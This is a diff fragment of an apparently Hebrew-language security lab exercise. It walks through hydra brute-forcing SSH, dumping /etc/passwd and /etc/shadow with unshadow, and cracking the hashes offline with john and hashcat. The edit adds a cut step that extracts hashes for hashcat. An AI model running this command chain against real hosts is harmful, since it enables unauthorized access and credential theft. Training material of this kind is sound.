@@ -48,9 +48,12 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4
 ssh admin@<target>
 # 3. אחרי גישה — השג Hashes נוספים
 sudo unshadow /etc/passwd /etc/shadow > crack.txt
-# 4. סדיקה לא-מקוונת
+# 4. סדיקה לא-מקוונת — John קורא את פורמט unshadow ישירות:
 john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
-hashcat -m 1800 -a 0 crack.txt /usr/share/wordlists/rockyou.txt
+# Hashcat, לעומת זאת, צריך רק את ה-hash עצמו (בלי שם המשתמש והשדות) —
+# לכן מחלצים תחילה את עמודת ה-hash, ורק אז מריצים:
+cut -d: -f2 crack.txt > hashes.txt
+hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **המשימה:**
